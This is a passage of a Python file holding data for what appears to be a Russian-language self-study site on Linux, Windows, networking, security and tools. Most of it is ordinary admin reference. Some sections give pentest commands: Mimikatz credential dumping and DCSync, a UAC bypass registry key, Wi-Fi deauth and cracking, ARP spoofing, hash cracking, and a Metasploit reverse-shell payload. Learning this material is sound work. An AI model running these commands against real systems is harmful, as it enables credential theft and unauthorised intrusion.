            '<strong>pacman</strong> — менеджер пакетов',
            '<strong>yay/paru</strong> — AUR-хелперы',
            '<strong>Rolling release</strong> — всегда свежий софт',
            '<strong>Arch Wiki</strong> — лучшая документация в мире Linux',
            '<strong>AUR</strong> — тысячи пользовательских пакетов',
        ]),
        ('pre', '# pacman\npacman -Syu           # обновление\npacman -S package     # установка\npacman -Rns package   # удаление\npacman -Qe            # мои пакеты\npacman -Qdt           # сироты\n\n# yay\nyay -S package        # из AUR\nyay -Syu              # обновление всего'),
    ]),
    make_submodule('🏗️ Systemd', [
        ('h3', 'Systemd — инициализация'),
        ('pre', '# Управление сервисами\nsystemctl start nginx\nsystemctl enable --now nginx\nsystemctl status nginx\nsystemctl restart nginx\nsystemctl stop nginx\n\n# Логи\njournalctl -u nginx -f\njournalctl --since "1 hour ago"\njournalctl -xe'),
        ('h3', 'Создание своего сервиса'),
        ('pre', '# /etc/systemd/system/myapp.service\n[Unit]\nDescription=My App\nAfter=network.target\n\n[Service]\nType=simple\nUser=radmir\nWorkingDirectory=/opt/myapp\nExecStart=/usr/bin/python /opt/myapp/main.py\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target'),
    ]),
    make_submodule('🐚 Zsh и Oh My Zsh', [
        ('h3', 'Настройка shell'),
        ('ul', [
            '<strong>Zsh</strong> — улучшенный bash',
            '<strong>Oh My Zsh</strong> — фреймворк для zsh',
            '<strong>powerlevel10k</strong> — красивое приглашение',
            '<strong>zsh-autosuggestions</strong> — автоподсказки',
            '<strong>zsh-syntax-highlighting</strong> — подсветка',
        ]),
        ('pre', '# Установка\nsudo pacman -S zsh\nsh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"\n\n# Плагины\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting'),
    ]),
    make_submodule('🌐 Сеть в Linux', [
        ('h3', 'Сетевые утилиты'),
        ('pre', '# iproute2 (современный)\nip addr              # IP адреса\nip link              # интерфейсы\nip route             # таблица маршрутизации\nss -tulpn            # сокеты\n\n# nmap (классика)\nnmap -sV 192.168.1.1\n\n# tcpdump\nsudo tcpdump -i eth0 port 80 -w capture.pcap'),
        ('h3', 'Настройка сети'),
        ('pre', '# Wi-Fi через iwd\niwctl\nstation wlan0 connect SSID\n\n# Статический IP\nip addr add 192.168.1.100/24 dev eth0\nip route add default via 192.168.1.1'),
    ]),
    make_submodule('💾 Управление дисками', [
        ('h3', 'Диски и разделы'),
        ('pre', '# Просмотр дисков\nlsblk          # дерево дисков\nfdisk -l       # таблица разделов\n\n# Монтирование\nmount /dev/sda1 /mnt\numount /mnt\n\n# Файловые системы\nmkfs.ext4 /dev/sda1\nmkfs.btrfs /dev/sda1\n\n# LVM\npvcreate /dev/sda1\nvgcreate vg0 /dev/sda1\nlvcreate -L 10G vg0 -n lv_root'),
    ]),
    make_submodule('🔄 Бэкапы', [
        ('h3', 'Стратегия бэкапов'),
        ('ul', [
            '<strong>rsync</strong> — синхронизация файлов',
            '<strong>borgbackup</strong> — дедуплицированные бэкапы',
            '<strong>restic</strong> — шифрованные бэкапы в облако',
            '<strong>dd</strong> — посекторное копирование',
            '<strong>timeshift</strong> — системные снапшоты',
        ]),
        ('pre', '# rsync\nrsync -avz --delete /source/ /backup/\n\n# borg\nborg init --encryption=repokey /backup\nborg create /backup::archive-$(date +%Y%m%d) /source\n\n# restic\nrestic init --repo /backup\nrestic backup /source'),
    ]),
    make_submodule('🖥️ WM и DE', [
        ('h3', 'Оконные менеджеры'),
        ('ul', [
            '<strong>i3wm</strong> — tile-based, минимализм',
            '<strong>Hyprland</strong> — Wayland, красивый, анимации',
            '<strong>Qtile</strong> — на Python, гибкий',
            '<strong>bspwm</strong> — binary space partitioning',
            '<strong>GNOME/KDE</strong> — полноценные DE',
        ]),
        ('p', 'Лично использую i3wm и Hyprland. Минимализм, скорость, полный контроль с клавиатуры.'),
    ]),
    make_submodule('📜 Логирование', [
        ('h3', 'Система логирования'),
        ('pre', '# journalctl\njournalctl -xe                    # последние логи\njournalctl -u nginx -f            # логи службы в реальном времени\njournalctl --since "2024-01-01"   # с даты\njournalctl -p err                 # только ошибки\n\n# syslog (классика)\n# /var/log/\nsyslog        # системные\nkern.log      # ядро\nauth.log      # авторизация'),
    ]),
    make_submodule('🐧 Ядро Linux', [
        ('h3', 'Работа с ядром'),
        ('pre', '# Информация\nuname -a            # версия ядра\ncat /proc/cpuinfo   # процессор\ncat /proc/meminfo   # память\nlsmod               # модули ядра\n\n# Модули\nmodprobe module_name   # загрузить\nmodprobe -r module_name # выгрузить\nlsmod | grep module    # проверить'),
        ('h3', 'Параметры ядра'),
        ('pre', '# sysctl\nsysctl -a                    # все параметры\nsysctl net.ipv4.ip_forward=1 # включить forwarding\n\n# /etc/sysctl.d/99-custom.conf\nnet.core.rmem_max = 134217728\nnet.core.wmem_max = 134217728'),
    ]),
    make_submodule('🔧 Тулинг', [
        ('h3', 'Must-have утилиты'),
        ('ul', [
            '<strong>htop/btop</strong> — мониторинг процессов',
            '<strong>ranger/lf</strong> — файловые менеджеры в терминале',
            '<strong>neovim</strong> — редактор',
            '<strong>tmux</strong> — мультиплексор терминалов',
            '<strong>fzf</strong> — размытый поиск',
            '<strong>ripgrep (rg)</strong> — быстрый grep',
            '<strong>bat</strong> — cat с подсветкой',
            '<strong>duf/ncdu</strong> — анализ диска',
        ]),
        ('p', 'Установка одной командой: <code>pacman -S htop neovim tmux fzf ripgrep bat duf</code>'),
    ]),
]

# ============================================================
# MODULE 5: Windows (8 submodules)
# ============================================================
windows_subs = [
    make_submodule('🔧 PowerShell', [
        ('h3', 'PowerShell — must know'),
        ('pre', '# Информация о системе\nGet-ComputerInfo\n\n# Сеть\nGet-NetTCPConnection\nTest-NetConnection google.com\nResolve-DnsName google.com\n\n# Процессы\nGet-Process\nStop-Process -Name notepad\n\n# Логи безопасности\nGet-WinEvent -LogName Security -MaxEvents 50\n\n# Скачать файл\nInvoke-WebRequest -Uri url -OutFile file'),
        ('h3', 'PowerShell скриптинг'),
        ('pre', '# Собрать информацию\n$computers = Get-Content computers.txt\nforeach ($pc in $computers) {\n    Get-WmiObject Win32_ComputerSystem -ComputerName $pc\n}'),
    ]),
    make_submodule('🏢 Active Directory', [
        ('h3', 'Основы AD'),
        ('ul', [
            '<strong>Централизованное управление</strong> — пользователи, компьютеры, группы',
            '<strong>Group Policy Objects (GPO)</strong> — массовая настройка системы',
            '<strong>Kerberos</strong> — протокол аутентификации',
            '<strong>LDAP</strong> — протокол доступа к каталогу',
            '<strong>Domain Controller</strong> — главный сервер AD',
        ]),
        ('h3', 'AD через PowerShell'),
        ('pre', '# Установка модуля\nInstall-WindowsFeature RSAT-AD-PowerShell\n\n# Поиск пользователей\nGet-ADUser -Filter * -Properties *\nGet-ADUser -Identity "username" -Properties EmailAddress\n\n# Поиск в AD\nGet-ADComputer -Filter * | select Name'),
    ]),
    make_submodule('🛡️ Безопасность Windows', [
        ('h3', 'Защита Windows'),
        ('ul', [
            '<strong>BitLocker</strong> — шифрование диска (TPM + PIN)',
            '<strong>AppLocker</strong> — контроль приложений (белые списки)',
            '<strong>WDAG</strong> — Windows Defender Application Guard',
            '<strong>LAPS</strong> — управление локальными паролями админов',
            '<strong>Windows Firewall</strong> — сетевой экран с продвинутыми правилами',
            '<strong>Defender for Endpoint</strong> — EDR-решение',
        ]),
    ]),
    make_submodule('🗄️ Реестр Windows', [
        ('h3', 'Работа с реестром'),
        ('pre', '# Чтение реестра\nGet-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion"\n\n# Изменение\nSet-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name Wallpaper -Value "C:\\bg.jpg"\n\n# Поиск\nGet-ChildItem -Path HKLM:\\Software -Recurse | Where-Object { $_.Name -like "*virus*" }'),
        ('h3', 'Реестр для пентеста'),
        ('ul', [
            '<strong>Autoruns</strong> — HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            '<strong>UAC bypass</strong> — HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command',
            '<strong>Persistence</strong> — реестровые ключи автозапуска',
        ]),
    ]),
    make_submodule('🌐 Windows Networking', [
        ('h3', 'Сетевые возможности'),
        ('pre', '# IP конфигурация\nipconfig /all\n\n# DNS\nnslookup example.com\n\n# Трассировка\ntracert google.com\npathping google.com\n\n# ARP таблица\narp -a\n\n# SMB\nnet use Z: \\\\server\\share\nGet-SmbShare'),
        ('h3', 'Windows Firewall'),
        ('pre', '# Правила\nNew-NetFirewallRule -DisplayName "Allow 8080" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow\n\n# Состояние\nGet-NetFirewallProfile | Format-Table Name, Enabled'),
    ]),
    make_submodule('📜 Логи Windows', [
        ('h3', 'Аудит и логи'),
        ('pre', '# Event Log\nGet-WinEvent -LogName Security -MaxEvents 100\nGet-WinEvent -FilterHashtable @{LogName="System"; Level=2}\n\n# Свои логи\nWrite-EventLog -LogName Application -Source MyApp -EntryType Error -EventId 100 -Message "Error!"'),
        ('h3', 'Важные Event ID'),
        ('ul', [
            '<strong>4624</strong> — успешный вход',
            '<strong>4625</strong> — неудачный вход',
            '<strong>4688</strong> — создание процесса',
            '<strong>4698</strong> — создание задачи планировщика',
            '<strong>4720</strong> — создание пользователя',
        ]),
    ]),
    make_submodule('🛠️ Sysinternals', [
        ('h3', 'Набор утилит Sysinternals'),
        ('ul', [
            '<strong>Process Explorer</strong> — продвинутый диспетчер задач',
            '<strong>Procmon</strong> — мониторинг процессов, файлов, реестра',
            '<strong>TCPView</strong> — сетевые соединения',
            '<strong>Autoruns</strong> — всё что запускается с системой',
            '<strong>PsExec</strong> — удалённое выполнение команд',
            '<strong>AccessChk</strong> — права доступа',
        ]),
        ('pre', '# Скачать набор\nInvoke-WebRequest -Uri https://live.sysinternals.com/PsExec.exe -OutFile psexec.exe\n\n# Удалённый запуск\npsexec \\\\target -u user -p pass cmd'),
    ]),
    make_submodule('🔍 Windows для пентеста', [
        ('h3', 'Атаки на Windows'),
        ('ul', [
            '<strong>Pass-the-Hash</strong> — Mimikatz, impacket-secretsdump',
            '<strong>Kerberoasting</strong> — получение TGS керберос',
            '<strong>AS-REP Roasting</strong> — пользователи без pre-auth',
            '<strong>LLMNR/NBT-NS Poisoning</strong> — Responder',
            '<strong>DCSync</strong> — синхронизация DC (нужны права админа)',
            '<strong>SMB Relay</strong> — ретрансляция NTLM',
        ]),
        ('pre', '# Mimikatz\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\nmimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt'),
    ]),
]

# ============================================================
# MODULE 6: Кибербезопасность (12 submodules)
# ============================================================
cyber_subs = [
    make_submodule('🔐 База безопасности', [
        ('h3', 'Что делать обязательно'),
        ('ul', [
            '<strong>2FA</strong> — везде, где можно. TOTP > SMS',
            '<strong>Менеджер паролей</strong> — Bitwarden, KeePass, 1Password',
            '<strong>Обновления</strong> — всегда вовремя, не откладывай',
            '<strong>Бэкапы</strong> — правило 3-2-1 (3 копии, 2 носителя, 1 офлайн)',
            '<strong>Шифрование</strong> — диски, переписка, файлы',
        ]),
    ]),
    make_submodule('🔑 Шифрование', [
        ('h3', 'Виды шифрования'),
        ('ul', [
            '<strong>Симметричное</strong> — AES-256, ChaCha20 (один ключ, быстро)',
            '<strong>Асимметричное</strong> — RSA-4096, ECC (публичный + приватный, медленно)',
            '<strong>Хэширование</strong> — SHA-256, bcrypt, argon2 (необратимо)',
            '<strong>Гибридное</strong> — TLS, GPG (симметричный ключ шифруется асимметрично)',
        ]),
        ('h3', 'GPG'),
        ('pre', '# Создать ключ\ngpg --full-generate-key\n\n# Зашифровать\ngpg -e -r "Name" file.txt\n\n# Расшифровать\ngpg -d file.txt.gpg\n\n# Подписать\ngpg -s file.txt\n\n# Экспорт публичного ключа\ngpg --export -a "Name" > pubkey.asc'),
    ]),
    make_submodule('🎭 Анонимность', [
        ('h3', 'Инструменты анонимности'),
        ('ul', [
            '<strong>Tor</strong> — анонимный веб-сёрфинг (луковичная маршрутизация)',
            '<strong>VPN</strong> — шифрование + смена IP (выбирай no-logs)',
            '<strong>Tails OS</strong> — анонимная ОС, не оставляет следов',
            '<strong>Whonix</strong> — Gateway + Workstation, трафик через Tor',
            '<strong>ProtonMail / Tutanota</strong> — приватная почта с шифрованием',
        ]),
        ('h3', 'Метаданные'),
        ('p', 'Удаляй EXIF из фото перед публикаций: <code>exiftool -all= photo.jpg</code>'),
    ]),
    make_submodule('📊 Threat Intelligence', [
        ('h3', 'Следи за угрозами'),
        ('ul', [
            '<strong>MITRE ATT&CK</strong> — база тактик и техник (14 тактик, 200+ техник)',
            '<strong>CVE / NVD</strong> — уязвимости с CVSS score',
            '<strong>AlienVault OTX</strong> — threat feeds, pulses',
            '<strong>Shodan</strong> — мониторинг устройств (InternetDB)',
            '<strong>VirusTotal</strong> — анализ файлов и URL',
            '<strong>The Hacker News / BleepingComputer</strong> — новости',
        ]),
    ]),
    make_submodule('📱 Безопасность мобильных', [
        ('h3', 'Мобильная безопасность'),
        ('ul', [
            '<strong>iOS vs Android</strong> — iOS безопаснее, Android гибче',
            '<strong>Не ставь сомнительные APK</strong> — даже не на эмулятор',
            '<strong>Отключай ненужные разрешения</strong> — гео, микрофон, камера',
            '<strong>VPN на телефоне</strong> — WireGuard, OpenVPN',
            '<strong>AdGuard DNS</strong> — блокировка трекеров на уровне DNS',
        ]),
    ]),
    make_submodule('🌐 Безопасность Wi-Fi', [
        ('h3', 'Защита Wi-Fi'),
        ('ul', [
            '<strong>WPA3</strong> — используй его, если поддерживается',
            '<strong>WPA2-CCMP (AES)</strong> — минимум, никакого TKIP',
            '<strong>Скрытие SSID</strong> — не помогает, не парься',
            '<strong>MAC-фильтрация</strong> — тоже не защита (MAC легко меняется)',
            '<strong>Гостевая сеть</strong> — для гостей и IoT устройств',
        ]),
        ('h3', 'Атаки на Wi-Fi'),
        ('pre', '# Aircrack-ng (Kali)\nsudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon\nsudo airodump-ng -c 6 --bssid MAC -w capture wlan0mon\nsudo aireplay-ng -0 5 -a MAC wlan0mon\nsudo aircrack-ng -w wordlist.txt capture-01.cap'),
    ]),
    make_submodule('🔒 Управление паролями', [
        ('h3', 'Как хранить пароли'),
        ('ul', [
            '<strong>Bitwarden</strong> — open source, облачный или self-hosted',
            '<strong>KeePassXC</strong> — локальное хранение, без облака',
            '<strong>1Password</strong> — платный, но удобный',
            '<strong>pass (password-store)</strong> — GPG + git, для терминала',
        ]),
        ('h3', 'Правила паролей'),
        ('ul', [
            'Каждый сервис — уникальный пароль',
            'Длина 16+ символов',
            'Используй парольную фразу (correct-horse-battery-staple)',
            'Включи 2FA везде где можно',
            'Меняй пароли только при компрометации',
        ]),
    ]),
    make_submodule('📧 Безопасность email', [
        ('h3', 'Защита почты'),
        ('ul', [
            '<strong>ProtonMail / Tutanota</strong> — шифрование end-to-end',
            '<strong>GPG</strong> — шифрование писем (неудобно, но безопасно)',
            '<strong>SPF, DKIM, DMARC</strong> — защита от подделки домена',
            '<strong>Алиасы</strong> — SimpleLogin, AnonAddy, Firefox Relay',
        ]),
        ('h3', 'Фишинг'),
        ('ul', [
            'Никогда не переходи по ссылкам из подозрительных писем',
            'Проверяй отправителя (не только имя, а email)',
            'Используй менеджер паролей — он не автозаполнит на фишинг-сайте',
            '2FA спасает даже если пароль украли',
        ]),
    ]),
    make_submodule('🛡️ EDR и AV', [
        ('h3', 'Endpoint Detection & Response'),
        ('ul', [
            '<strong>Windows Defender</strong> — встроенный, неплохой (попробуй ASR Rules)',
            '<strong>CrowdStrike</strong> — топ EDR, облачный',
            '<strong>SentinelOne</strong> — автономный AI-EDR',
            '<strong>Wazuh</strong> — open source SIEM + EDR',
            '<strong>Velociraptor</strong> — DFIR + охота за угрозами',
        ]),
        ('p', 'Современные EDR детектят не сигнатуры, а поведение. Mimikatz, LSASS dump, process injection — всё это ловится.'),
    ]),
    make_submodule('🌐 DNS Security', [
        ('h3', 'Защита DNS'),
        ('ul', [
            '<strong>DNSSEC</strong> — подпись DNS записей',
            '<strong>DNS over HTTPS (DoH)</strong> — шифрование DNS запросов',
            '<strong>DNS over TLS (DoT)</strong> — альтернатива DoH',
            '<strong>Pi-hole</strong> — блокировка рекламы и трекеров на DNS уровне',
            '<strong>AdGuard DNS</strong> — публичный DNS с фильтрацией',
        ]),
        ('pre', '# Pi-hole установка\ncurl -sSL https://install.pi-hole.net | bash\n\n# AdGuard DNS (клиент)\nnano /etc/resolv.conf\nnameserver 94.140.14.14\nnameserver 94.140.15.15'),
    ]),
    make_submodule('📋 Compliance', [
        ('h3', 'Стандарты и регуляции'),
        ('ul', [
            '<strong>GDPR</strong> — защита данных в EU',
            '<strong>PCI DSS</strong> — безопасность платежных карт',
            '<strong>ISO 27001</strong> — стандарт управления информационной безопасностью',
            '<strong>SOC 2</strong> — аудит для облачных сервисов',
            '<strong>152-ФЗ</strong> — персональные данные в РФ',
        ]),
        ('p', 'Compliance — это не про безопасность, а про соответствие. Но соответствие часто подразумевает безопасность.'),
    ]),
    make_submodule('🔄 Реагирование на инциденты', [
        ('h3', 'IR Framework (NIST)'),
        ('ol', [
            '<strong>Preparation</strong> — подготовка, инструменты, контакты',
            '<strong>Detection & Analysis</strong> — обнаружение, анализ, триаж',
            '<strong>Containment</strong> — изоляция, чтобы не распространялось',
            '<strong>Eradication</strong> — удаление угрозы',
            '<strong>Recovery</strong> — восстановление из бэкапов',
            '<strong>Post-Mortem</strong> — разбор, выводы, улучшения',
        ]),
        ('h3', 'Полезные инструменты'),
        ('ul', [
            '<strong>Volatility</strong> — анализ памяти (RAM dump)',
            '<strong>Autopsy / Sleuth Kit</strong> — форензика дисков',
            '<strong>Redline</strong> — сбор индикаторов компрометации',
            '<strong>YARA</strong> — правила для обнаружения малвари',
        ]),
    ]),
]

# ============================================================
# MODULE 7: Сети / Networking (10 submodules)
# ============================================================
networks_subs = [
    make_submodule('📡 Основы TCP/IP', [
        ('h3', 'Модель TCP/IP'),
        ('ul', [
            '<strong>Application</strong> — HTTP, FTP, DNS, SSH, SMTP',
            '<strong>Transport</strong> — TCP (надёжный), UDP (быстрый)',
            '<strong>Internet</strong> — IP, ICMP, ARP',
            '<strong>Link</strong> — Ethernet, Wi-Fi, PPP',
        ]),
        ('h3', 'Порты (основные)'),
        ('pre', '21  — FTP\n22  — SSH\n23  — Telnet\n25  — SMTP\n53  — DNS\n80  — HTTP\n110 — POP3\n143 — IMAP\n443 — HTTPS\n3306 — MySQL\n3389 — RDP\n5432 — PostgreSQL\n6379 — Redis\n8080 — HTTP-alt'),
    ]),
    make_submodule('🔗 Прокси и VPN', [
        ('h3', 'Типы прокси'),
        ('ul', [
            '<strong>HTTP прокси</strong> — только веб-трафик, понимает HTTP',
            '<strong>HTTPS прокси</strong> — CONNECT метод, туннелирует TLS',
            '<strong>SOCKS5</strong> — любой трафик (TCP, UDP), без анализа',
            '<strong>Transparent</strong> — прозрачный прокси (кеширующий)',
        ]),
        ('h3', 'VPN протоколы'),
        ('ul', [
            '<strong>OpenVPN</strong> — стандарт, гибкий, TCP/UDP',
            '<strong>WireGuard</strong> — современный, быстрый (в ядре Linux)',
            '<strong>IKEv2/IPSec</strong> — мобильный, стабильный',
            '<strong>L2TP/IPSec</strong> — устаревший, медленный',
        ]),
        ('pre', '# WireGuard\n# /etc/wireguard/wg0.conf\n[Interface]\nPrivateKey = xxx\nAddress = 10.0.0.2/24\n\n[Peer]\nPublicKey = yyy\nEndpoint = server:51820\nAllowedIPs = 0.0.0.0/0'),
    ]),
    make_submodule('🔍 Анализ трафика', [
        ('h3', 'Инструменты'),
        ('ul', [
            '<strong>Wireshark</strong> — графический анализ (фильтры, статистика)',
            '<strong>tcpdump</strong> — CLI-захват (лёгкий, везде)',
            '<strong>tshark</strong> — CLI WireShark (скрипты)',
            '<strong>ngrep</strong> — grep для сети',
            '<strong>nethogs</strong> — трафик по процессам',
        ]),
        ('pre', '# tcpdump\nsudo tcpdump -i eth0 -n port 80\nsudo tcpdump -i eth0 -w capture.pcap\nsudo tcpdump -r capture.pcap -X\n\n# Wireshark фильтры\nhttp.request\nip.addr == 192.168.1.1\ntcp.port == 443'),
    ]),
    make_submodule('🌐 DNS', [
        ('h3', 'Как работает DNS'),
        ('ul', [
            '<strong>Рекурсивный резолвер</strong> — 8.8.8.8, 1.1.1.1',
            '<strong>Authoritative</strong> — отвечает за зону',
            '<strong>Записи</strong> — A, AAAA, MX, CNAME, TXT, NS, SOA',
        ]),
        ('pre', '# DNS запросы\ndig example.com ANY\nnslookup example.com\nhost example.com\n\n# DNS трассировка\ndig +trace example.com\n\n# Обратный поиск\ndig -x 8.8.8.8'),
        ('h3', 'Типы DNS атак'),
        ('ul', [
            '<strong>DNS Spoofing</strong> — подделка ответов DNS',
            '<strong>DNS Tunneling</strong> — передача данных через DNS',
            '<strong>DNS Rebinding</strong> — обход CORS',
        ]),
    ]),
    make_submodule('📦 HTTP/HTTPS', [
        ('h3', 'HTTP протокол'),
        ('ul', [
            '<strong>Методы</strong> — GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS',
            '<strong>Коды</strong> — 200 OK, 301 Moved, 403 Forbidden, 404 Not Found, 500 Server Error',
            '<strong>Заголовки</strong> — Content-Type, Authorization, Cookie, User-Agent, Referer',
        ]),
        ('pre', '# HTTP запрос вручную\necho -e "GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n" | nc example.com 80\n\n# curl\ncurl -v https://example.com\ncurl -X POST -d "key=value" https://api.example.com\ncurl -H "Authorization: Bearer token" https://api.example.com'),
        ('h3', 'HTTPS (TLS)'),
        ('ul', [
            '<strong>Handshake</strong> — ClientHello → ServerHello → Cert → KeyExchange → Done',
            '<strong>Версии</strong> — TLS 1.2 (безопасно), TLS 1.3 (быстро и безопасно)',
            '<strong>SSL</strong> — deprecated, не используй',
        ]),
    ]),
    make_submodule('🔌 Сетевые устройства', [
        ('h3', 'Оборудование'),
        ('ul', [
            '<strong>Hub</strong> — тупой повторитель (не используется)',
            '<strong>Switch</strong> — коммутатор L2 (MAC-адреса)',
            '<strong>Router</strong> — маршрутизатор L3 (IP-адреса)',
            '<strong>Firewall</strong> — фильтр трафика (L3-L7)',
            '<strong>Load Balancer</strong> — распределение нагрузки',
            '<strong>IDS/IPS</strong> — обнаружение/предотвращение вторжений',
        ]),
    ]),
    make_submodule('📊 Мониторинг сети', [
        ('h3', 'Инструменты мониторинга'),
        ('ul', [
            '<strong>Nagios/Icinga</strong> — классический мониторинг',
            '<strong>Zabbix</strong> — всё в одном, сложный',
            '<strong>Prometheus + Grafana</strong> — современный, метрики',
            '<strong>ELK Stack</strong> — логи (Elasticsearch, Logstash, Kibana)',
            '<strong>Netdata</strong> — real-time, красиво',
        ]),
        ('pre', '# Netdata\nbash <(curl -Ss https://my-netdata.io/kickstart.sh)\n# Панель на http://localhost:19999'),
    ]),
    make_submodule('🔒 Сетевые атаки', [
        ('h3', 'Типы атак'),
        ('ul', [
            '<strong>MITM (Man-in-the-Middle)</strong> — перехват трафика',
            '<strong>ARP Spoofing</strong> — подмена ARP таблицы',
            '<strong>DNS Spoofing</strong> — подделка DNS ответов',
            '<strong>SYN Flood</strong> — DoS на TCP handshake',
            '<strong>Smurf Attack</strong> — ICMP amplification',
        ]),
        ('pre', '# ARP Spoofing (Ettercap)\nsudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//\n\n# ARP таблица\narp -a\n\n# Статический ARP (защита)\narp -s 192.168.1.1 AA:BB:CC:DD:EE:FF'),
    ]),
    make_submodule('🌍 Маршрутизация', [
        ('h3', 'Основы маршрутизации'),
        ('ul', [
            '<strong>Статическая</strong> — ручные маршруты (ip route add)',
            '<strong>Динамическая</strong> — BGP (Internet), OSPF (внутри AS)',
            '<strong>NAT</strong> — трансляция адресов (1 публичный → N внутренних)',
        ]),
        ('pre', '# Таблица маршрутизации\nip route\nroute -n\n\n# Добавить маршрут\nip route add 10.0.0.0/24 via 192.168.1.1 dev eth0\n\n# NAT (iptables)\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE'),
    ]),
    make_submodule('📡 Беспроводные сети', [
        ('h3', 'Wi-Fi стандарты'),
        ('ul', [
            '<strong>802.11ax (Wi-Fi 6)</strong> — современный, OFDMA',
            '<strong>802.11ac (Wi-Fi 5)</strong> — предыдущий стандарт',
            '<strong>802.11n (Wi-Fi 4)</strong> — старый, но везде',
            '<strong>5 GHz vs 2.4 GHz</strong> — скорость vs дальность',
        ]),
        ('h3', 'Безопасность Wi-Fi'),
        ('ul', [
            '<strong>WPA3</strong> — SAE handshake, защита от dictionary атак',
            '<strong>WPA2-CCMP</strong> — AES, минимальный стандарт',
            '<strong>WEP</strong> — сломан, не использовать',
        ]),
    ]),
]

# ============================================================
# MODULE 8: Инструменты (9 submodules)
# ============================================================
tools_subs = [
    make_submodule('💻 Терминал', [
        ('h3', 'Мой стек'),
        ('ul', [
            '<strong>Kitty / Alacritty</strong> — терминалы (GPU-ускорение)',
            '<strong>tmux</strong> — мультиплексор (сессии, окна, панели)',
            '<strong>neovim</strong> — редактор (с LSP, treesitter)',
            '<strong>fzf</strong> — размытый поиск (Ctrl+R, Ctrl+T)',
            '<strong>ripgrep (rg)</strong> — быстрый grep',
            '<strong>bat</strong> — cat с подсветкой синтаксиса',
            '<strong>lsd/eza</strong> — ls с иконками и цветами',
        ]),
    ]),
    make_submodule('🐙 Git', [
        ('h3', 'Команды Git'),
        ('pre', 'git init\ngit clone <url>\ngit add .\ngit commit -m "message"\ngit push origin main\ngit pull\ngit log --oneline --graph --all\ngit diff\ngit stash\ngit checkout -b feature\ngit merge feature\ngit rebase -i HEAD~3\ngit blame file.py'),
        ('h3', 'Git Workflow'),
        ('ul', [
            'main — стабильный код',
            'develop — разработка',
            'feature/* — новые фичи',
            'fix/* — багфиксы',
            'hotfix/* — срочные правки',
        ]),
    ]),
    make_submodule('🐳 Docker', [
        ('h3', 'Основные команды'),
        ('pre', 'docker ps -a\ndocker images\ndocker build -t name .\ndocker run -d --name web -p 80:80 nginx\ndocker exec -it container sh\ndocker logs -f container\ndocker cp file.txt container:/tmp/\ndocker compose up -d\ndocker compose down\ndocker system prune -a'),
    ]),
    make_submodule('🛡️ Nmap', [
        ('h3', 'Сканирование портов'),
        ('pre', '# Базовое\nnmap 192.168.1.1\nnmap -sV 192.168.1.1    # версии сервисов\nnmap -sC 192.168.1.1    # скрипты\nnmap -A 192.168.1.1     # агрессивное\n\n# Продвинутое\nnmap -p- 192.168.1.1    # все порты (65535)\nnmap -sU 192.168.1.1    # UDP\nnmap -sS 192.168.1.1    # SYN scan (stealth)\n\n# Со сканами\nnmap --script vuln 192.168.1.1\nnmap --script http-enum 192.168.1.1'),
    ]),
    make_submodule('🎯 Burp Suite', [
        ('h3', 'Burp Suite функции'),
        ('ul', [
            '<strong>Proxy</strong> — перехват HTTP/HTTPS трафика',
            '<strong>Repeater</strong> — повторение запросов',
            '<strong>Intruder</strong> — брутфорс, фаззинг',
            '<strong>Decoder</strong> — кодирование/декодирование',
            '<strong>Comparer</strong> — сравнение запросов',
            '<strong>Scanner</strong> — автоматический поиск уязвимостей (Pro)',
            '<strong>Extender</strong> — плагины (разметка, активные сканы)',
        ]),
    ]),
    make_submodule('⚡ Netcat', [
        ('h3', 'Швейцарский нож'),
        ('pre', '# Слушать порт (reverse shell listener)\nnc -lvnp 4444\n\n# Подключиться\nnc example.com 80\n\n# Передача файла\n# Отправитель:\nnc -lvnp 4444 < file.txt\n# Получатель:\nnc target 4444 > received.txt\n\n# Порт-сканирование\nnc -zv 192.168.1.1 22-1000\n\n# Чат\n# Слушатель:\nnc -lvnp 5555\n# Клиент:\nnc target 5555'),
    ]),
    make_submodule('🔐 Hashcat / John', [
        ('h3', 'Взлом хэшей'),
        ('pre', '# Hashcat\nhashcat -m 0 -a 0 hash.txt rockyou.txt    # MD5\nhashcat -m 1000 -a 0 hash.txt rockyou.txt  # NTLM\nhashcat -m 13100 -a 0 hash.txt rockyou.txt # Kerberos TGS\n\n# John\njohn --wordlist=rockyou.txt hash.txt\n\n# Режимы\n-a 0  # словарная\n-a 3  # маска (brute force)'),
        ('p', '<strong>Совет:</strong> используй rule-based атаки — они гораздо эффективнее простого словаря.'),
    ]),
    make_submodule('🔧 Metasploit', [
        ('h3', 'Metasploit Framework'),
        ('pre', 'msfconsole\n\n# Поиск эксплойта\nsearch type:exploit target:linux\n\n# Использовать модуль\nuse exploit/multi/http/struts2_content_type_ognl\nshow options\nset RHOSTS target.com\nrun\n\n# Payload\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.1\nset LPORT 4444'),
        ('ul', [
            '<strong>Модули</strong> — exploit, payload, auxiliary, post, encoder',
            '<strong>Meterpreter</strong> — продвинутый payload (загрузка, дамп, скриншоты)',
            '<strong>Resource scripts</strong> — автоматизация (.rc файлы)',
        ]),
    ]),
    make_submodule('🌐 Wireshark', [
        ('h3', 'Анализ трафика'),
        ('ul', [
            '<strong>Фильтры захвата</strong> — port 80, host 1.1.1.1',
            '<strong>Фильтры отображения</strong> — http.request, ip.addr==x',
            '<strong>Follow TCP Stream</strong> — собрать всю HTTP сессию',
            '<strong>Статистика</strong> — протоколы, диалоги, IO Graph',
        ]),
